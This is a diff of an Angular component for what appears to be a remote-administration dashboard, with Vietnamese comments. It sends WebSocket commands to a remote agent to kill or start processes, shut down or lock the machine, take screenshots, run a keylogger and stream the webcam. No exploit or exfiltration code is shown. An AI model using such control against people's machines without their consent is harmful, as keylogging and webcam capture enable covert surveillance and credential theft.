@@ -1,216 +1,179 @@
-// src/app/pages/agent-detail/agent-detail.ts
-import { Component, OnInit, inject, effect } from '@angular/core';
+import { Component, signal, computed } from '@angular/core';
 import { ActivatedRoute } from '@angular/router';
-import { AgentService } from '../../services/agent.service';
+import { CommonModule, JsonPipe } from '@angular/common';
+
 import { WebSocketService } from '../../services/websocket.service';
-
-import { NgIf, NgFor, NgClass, JsonPipe } from '@angular/common';
-import { FormsModule } from '@angular/forms';
-
-type ModuleName = 'PROCESS' | 'SYSTEM' | 'SCREEN' | 'APP' | 'KEYLOGGER' | 'WEBCAM' | null;
 
 @Component({
   selector: 'app-agent-detail',
   standalone: true,
-  imports: [NgIf, NgFor, NgClass, FormsModule, JsonPipe],
-  templateUrl: './agent-detail.html'
+  imports: [CommonModule, JsonPipe],
+  templateUrl: './agent-detail.html',
+  styleUrls: ['./agent-detail.css']
 })
-export class AgentDetailPage implements OnInit {
-  ws = inject(WebSocketService);
-  route = inject(ActivatedRoute);
-  agentService = inject(AgentService);
+export class AgentDetailComponent {
 
+  selectedModule = signal<string | null>(null);
+
+  processList = computed(() => this.ws.processList());
+  appList = computed(() => this.ws.appList());
+  keylogEntries = computed(() => this.ws.keylogList());
+  screenshot = computed(() => this.ws.screenshotUrl());
+  webcamFrame = computed(() => this.ws.webcamFrameUrl());
+
+  rawJson = '';
   agent: any = null;
-  agentId = '';
+  loading = signal<boolean>(true);
 
-  // JSON thô để test
-  rawJson = '{\n  "module": "PROCESS",\n  "command": "LIST"\n}';
+  constructor(
+    public ws: WebSocketService,
+    private route: ActivatedRoute
+  ) {}
 
-  // hiển thị kết quả / gói tin cuối cùng
-  lastResponse: any = null;
-
-  // module đang được chọn trong khu Modules
-  selectedModule: ModuleName = null;
-
-  // dữ liệu demo cho một số module (nếu agent có trả về)
-  processList: any[] = [];
-  appList: any[] = [];
-  keylogEntries: any[] = [];
-
-  ngOnInit(): void {
-    // lấy ID agent từ URL
-    this.agentId = this.route.snapshot.params['id'];
-
-    // load thông tin agent
-    this.agentService.getAgents().subscribe(list => {
-      this.agent = list.find(a => a.machineId === this.agentId);
-    });
-
-    // theo dõi WebSocket lastMessage() (signal)
-    effect(() => {
-      const msg = this.ws.lastMessage();
-      if (!msg) {
+  ngOnInit() {
+    this.route.paramMap.subscribe(params => {
+      const id = params.get("id");
+      if (!id) {
+        console.error("Không tìm thấy ID trong route.");
         return;
       }
-      this.lastResponse = msg;
 
-      // nếu backend có trả đúng format thì mấy đoạn dưới sẽ tự fill table
-      if (msg.module === 'PROCESS' && msg.command === 'LIST' && Array.isArray(msg.data)) {
-        this.processList = msg.data;
-      }
-
-      if (msg.module === 'APP' && msg.command === 'LIST_APPS' && Array.isArray(msg.data)) {
-        this.appList = msg.data;
-      }
-
-      if (msg.module === 'KEYLOGGER' && msg.command === 'GET_LOG' && Array.isArray(msg.data)) {
-        this.keylogEntries = msg.data;
-      }
+      // 📌 Fetch agent từ Registry server
+      this.fetchAgent(id);
     });
   }
 
-  // ================== WebSocket ==================
+  // ================================
+  // FETCH AGENT
+  // ================================
+  fetchAgent(machineId: string) {
+    this.loading.set(true);
 
-  connectWS(): void {
-    if (!this.agent) {
-      return;
-    }
-    const url = `ws://${this.agent.ip}:${this.agent.wsPort}`;
-    console.log('Connecting to:', url);
-    this.ws.connect(url);
+    fetch(`http://localhost:3000/api/agents/${machineId}`)
+      .then(r => r.json())
+      .then(agent => {
+        this.agent = agent;
+      })
+      .catch(err => {
+        console.error("Lỗi load agent:", err);
+      })
+      .finally(() => {
+        this.loading.set(false);
+      });
   }
 
-  private ensureConnected(): boolean {
-    if (!this.ws.isConnected()) {
-      alert('Vui lòng kết nối WebSocket trước (nút "Kết nối WebSocket").');
-      return false;
-    }
-    return true;
+  // ================================
+  // WEBSOCKET
+  // ================================
+
+  connectWS() {
+    if (!this.agent) return;
+
+    console.log("Connecting to WS:", this.agent.ip, this.agent.wsPort);
+    this.ws.connect(this.agent.ip, this.agent.wsPort);
   }
 
-  // helper gửi command theo format nhóm
-  private sendCommand(module: string, command: string, extra: Record<string, any> = {}): void {
-    if (!this.ensureConnected()) {
-      return;
-    }
-    const payload = {
-      module,
-      command,
-      ...extra
-    };
-    console.log('Sending WS payload:', payload);
-    this.ws.send(payload);
+  // ================================
+  // MODULE UI
+  // ================================
+
+  backToModules() {
+    this.selectedModule.set(null);
   }
 
-  // ================== JSON thô ==================
+  openModule(m: string) {
+    this.selectedModule.set(m);
+  }
 
-  sendRawJson(): void {
-    if (!this.ensureConnected()) {
-      return;
-    }
+  // ================================
+  // RAW JSON
+  // ================================
+  sendRawJson() {
     try {
-      const obj = JSON.parse(this.rawJson);
-      this.ws.send(obj);
-    } catch (e) {
-      alert('JSON không hợp lệ, hãy kiểm tra lại cú pháp.');
+      const json = JSON.parse(this.rawJson);
+      this.ws.sendJson(json);
+    } catch {
+      alert("JSON không hợp lệ!");
     }
   }
 
-  // ================== Modules UI ==================
-
-  openModule(module: ModuleName): void {
-    this.selectedModule = module;
+  // PROCESS
+  sendProcessList() {
+    this.ws.sendJson({ module: "PROCESS", command: "LIST" });
   }
 
-  backToModules(): void {
-    this.selectedModule = null;
+  sendProcessKill() {
+    const pid = prompt("Nhập PID cần kill:");
+    if (pid) this.ws.sendJson({ module: "PROCESS", command: "KILL", pid: Number(pid) });
   }
 
-  // -------- PROCESS --------
-  sendProcessList(): void {
-    this.sendCommand('PROCESS', 'LIST');
+sendProcessStart() {
+  const exe = prompt("Nhập tên file .exe cần chạy:");
+  if (exe) this.ws.sendJson({
+    module: "PROCESS",
+    command: "START",
+    payload: { path: exe }
+  });
+}
+
+  // SYSTEM
+  sendSystemShutdown() {
+    this.ws.sendJson({ module: "SYSTEM", command: "SHUTDOWN" });
   }
 
-  sendProcessKill(): void {
-    const pidStr = prompt('Nhập PID cần KILL:');
-    if (!pidStr) {
-      return;
-    }
-    const pid = Number(pidStr);
-    if (Number.isNaN(pid)) {
-      alert('PID không hợp lệ');
-      return;
-    }
-    this.sendCommand('PROCESS', 'KILL', { pid });
+  sendSystemRestart() {
+    this.ws.sendJson({ module: "SYSTEM", command: "RESTART" });
   }
 
-  sendProcessStart(): void {
-    const path = prompt('Nhập đường dẫn / tên file để START (ví dụ: notepad.exe):', 'notepad.exe');
-    if (!path) {
-      return;
-    }
-    const args = prompt('Nhập arguments (có thể để trống):', '') ?? '';
-    this.sendCommand('PROCESS', 'START', { path, args });
+  sendSystemLogoff() {
+    this.ws.sendJson({ module: "SYSTEM", command: "LOGOFF" });
   }
 
-  // -------- SYSTEM --------
-  sendSystemShutdown(): void {
-    this.sendCommand('SYSTEM', 'SHUTDOWN', { force: true });
+  sendSystemLock() {
+    this.ws.sendJson({ module: "SYSTEM", command: "LOCK" });
   }
 
-  sendSystemRestart(): void {
-    this.sendCommand('SYSTEM', 'RESTART', { force: true });
+  // SCREENSHOT
+  sendScreenCaptureBinary() {
+    this.ws.sendJson({ module: "SCREEN", command: "CAPTURE_BINARY" });
   }
 
-  sendSystemLogoff(): void {
-    this.sendCommand('SYSTEM', 'LOGOFF', {});
+  clearScreenshot() {
+    this.ws.screenshotUrl.set(null);
   }
 
-  sendSystemLock(): void {
-    this.sendCommand('SYSTEM', 'LOCK', {});
+  // APP
+  sendAppList() {
+    this.ws.sendJson({ module: "APP", command: "LIST" });
   }
 
-  // -------- SCREEN --------
-  sendScreenCapture(): void {
-    this.sendCommand('SCREEN', 'CAPTURE', { format: 'png', scale: 1.0 });
+  sendAppStart() {
+  const name = prompt("Nhập app cần mở:");
+  if (name) this.ws.sendJson({
+    module: "APP",
+    command: "START",
+    payload: { path: name }
+  });
+}
+  // KEYLOGGER
+  sendKeyloggerStart() {
+    this.ws.sendJson({ module: "KEYBOARD", command: "START" });
   }
 
-  // -------- APP --------
-  sendAppList(): void {
-    this.sendCommand('APP', 'LIST_APPS');
+  sendKeyloggerStop() {
+    this.ws.sendJson({ module: "KEYBOARD", command: "STOP" });
   }
 
-  sendAppStart(): void {
-    const appId = prompt('Nhập app_id cần START (ví dụ: notepad):', 'notepad');
-    if (!appId) {
-      return;
-    }
-    this.sendCommand('APP', 'START_APP', { app_id: appId });
+  sendKeyloggerGetLog() {
+    this.ws.sendJson({ module: "KEYBOARD", command: "GET_LOG" });
   }
 
-  // -------- KEYLOGGER --------
-  sendKeyloggerStart(): void {
-    this.sendCommand('KEYLOGGER', 'START_LOG');
+  // WEBCAM
+  sendWebcamStartStream() {
+    this.ws.sendJson({ module: "WEBCAM", command: "START_STREAM" });
   }
 
-  sendKeyloggerStop(): void {
-    this.sendCommand('KEYLOGGER', 'STOP_LOG');
-  }
-
-  sendKeyloggerGetLog(): void {
-    const sinceStr = prompt('Lấy log từ id (since_id), mặc định 0:', '0') ?? '0';
-    const since_id = Number(sinceStr);
-    this.sendCommand('KEYLOGGER', 'GET_LOG', { since_id });
-  }
-
-  // -------- WEBCAM --------
-  sendWebcamCapturePhoto(): void {
-    this.sendCommand('WEBCAM', 'CAPTURE_PHOTO');
-  }
-
-  sendWebcamRecordVideo(): void {
-    const durStr = prompt('Thời lượng video (giây):', '10') ?? '10';
-    const duration_sec = Number(durStr);
-    this.sendCommand('WEBCAM', 'RECORD_VIDEO', { duration_sec });
+  sendWebcamStopStream() {
+    this.ws.sendJson({ module: "WEBCAM", command: "STOP_STREAM" });
   }
 }
